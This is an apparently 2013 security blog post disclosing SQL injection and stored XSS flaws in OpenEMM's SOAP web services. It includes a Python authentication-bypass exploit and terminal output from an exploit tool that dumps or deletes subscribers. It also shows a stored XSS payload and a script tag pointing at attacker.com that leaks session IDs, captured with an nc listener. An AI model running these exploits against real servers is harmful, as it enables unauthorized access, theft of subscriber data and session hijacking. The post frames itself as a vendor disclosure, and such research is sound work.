---
categories:
- sqli
- xss
- openemm
comments: false
date: "2013-07-28T22:24:15Z"
title: OpenEMM-2013 SOAP SQLi/Stored XSS
---

[OpenEMM](http://www.openemm.org/) is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it's free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.

Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):

```
  /**
     * Gets the SQL string.
     */
    public static String getSQLSafeString(String input) {
        if (input == null) {
            return " ";
        } else {
            return input.replace("'", "''");
        }
    }
```        

This function inadequately sanitizes input.  The following malicious input would successfully slip through:

```
\' AND UNION SELECT 1,2,3;-- 
```

Which, when inserted into an example query `SELECT * FROM admin WHERE username = '$user';` becomes
`SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';`

This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):

```
protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
        boolean result=false;
        Connection dbConn=this.getConnection(msct);
        Statement agnStatement=null;
        ResultSet rset=null;
        
        try {
            agnStatement=dbConn.createStatement();
            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
            if(rset!=null && rset.next()) {
                result=true;
            } else {
                result=false;
                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
            }
```

As shown, the vulnerable `getSQLSafeString` method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at `http://yourhost.com/emm_webservices`).

The following code will bypass SOAP authentication and add a new mailing list:

```
from SOAPpy import WSDL

wsdl_file = "./ws.wsdl"
sploit = "\\' OR 1=1;-- "

_server = WSDL.Proxy(wsdl_file)
ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
if ret > 0:
    print 'success (%d)'%ret
```

This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I've included exploit code that exploits several of these functions:

```
root@jali:~/exploits# python openemm_wsdl.py -h
usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]

optional arguments:
  -h, --help  show this help message and exit
  -i HOST     server address
  -s          fetch all subscribers
  -m MLIST    create new mailing list (XSS)
  --dm        delete all mailing lists
  --ds        delete all subscribers
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
<SOAPpy.Types.structType multiRef at 30449464>: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
<SOAPpy.Types.structType multiRef at 30446728>: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
[!] Discovered 2 subscribers
root@jali:~/exploits# 
```

Our "end goal" for this exploit is, however, not just adding mailing lists or deleting content; we'd like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.

Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:

```
mysql> select user();
+-------------------+
| user()            |
+-------------------+
| agnitas@localhost |
+-------------------+
1 row in set (0.00 sec)

mysql> show grants;
+----------------------------------------------------------------------------------------------------------------------------------------------------+
| Grants for agnitas@localhost                                                                                                                       |
+----------------------------------------------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
+----------------------------------------------------------------------------------------------------------------------------------------------------+
3 rows in set (0.00 sec)

mysql> 
```

This is the user specified by `webapps/openemm/WEB-INF/classes/emm.properties`.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.

From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list's Description field:

```
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
[!] Description field vulnerable to stored xss!
[!] Enter mlist description: <script>alert('XSS!')</script>
[!] Saved successfully
root@jali:~/exploits# 
```

{{< figure class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg" >}}

With this, we can siphon off session ID's by simply injecting `<script src="http://attacker.com"/>`.  We do not need to send document.cookie because, surprise, session ID's are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:

```
root@jali:~/exploits# nc -l -p 80
GET / HTTP/1.1
Host: 192.168.1.147
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
Connection: keep-alive

^C
root@jali:~/exploits# 
```

We then simply make the same request in the Referrer field and we've got access to the account.

[Exploit](http://pastebin.com/JLh7BYYj)<br/>
[wsdl](http://pastebin.com/GXdw3FcQ)
